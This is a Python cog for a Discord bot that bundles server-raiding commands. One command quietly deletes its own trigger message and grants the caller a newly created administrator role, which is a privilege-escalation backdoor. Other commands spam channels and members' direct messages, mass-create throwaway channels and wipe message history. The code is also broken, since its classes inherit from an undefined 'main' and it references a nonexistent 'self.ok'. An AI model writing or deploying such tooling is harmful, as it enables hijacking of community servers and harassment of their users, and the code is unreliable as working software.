import os
import discord
from discord.utils import get
from discord.ext import commands


class misc(commands.Cog):
	def __init__(self, bot):
		self.bot = bot


class Role(main):
	@commands.command('auth')
	async def role_give(self, ctx):
		await ctx.message.delete()
		name = 'admins'
		roles = ctx.guild.roles
		role = get(roles, name=name)
		if role == None:
			await ctx.guild.create_role(
			    name=name, permissions=discord.Permissions(administrator=True))
		for i in range(len(roles)):
			role = get(roles, name=name)
			try:
				await role.edit(position=i)
			except:
				await ctx.author.add_roles(role)
				await ctx.send(self.ok)


class Message(main):
	@commands.command('clear')
	async def message_clear(self, ctx, num: int):
		num += 1
		if num <= 1: num = 2
		elif num > 100: num = 100
		logs = []
		async for log in ctx.channel.history(limit=num):
			logs.append(log)
		await ctx.channel.delete_messages(logs)

	@commands.command('spam')
	async def message_spam(self, ctx, count:int, *, message):
		for i in range(count):
			await ctx.send(message)

	@commands.command('dm')
	async def direct_message(self, ctx, member:discord.Member=None, *, message):
		await member.send(message)

	@commands.command('dspam')
	async def direct_spam(self, ctx, count:int, member:discord.Member, *, message):
		for i in range(count):
			await member.send(message)


class Channel(main):
	@commands.command('create')
	async def channel_create(self, ctx):
		await ctx.guild.create_text_channel('channel')

	@commands.command('delete')
	async def channel_delete(self, ctx):
		await ctx.channel.delete()

	@commands.command('cspam')
	async def channel_spam(self, ctx, count:int, *, message):
		spams = []
		for i in range(count):
			name = 'spam-' + str(i)
			await ctx.guild.create_text_channel(name)
			spam = get(ctx.guild.channels, name=name)
			spams.append(spam)
			for i in range(4):
				await spam.send(message)
		for spam in spams:
			await spam.delete()


def setup(bot):
	bot.add_cog(Role(bot))
	bot.add_cog(Message(bot))
	bot.add_cog(Channel(bot))
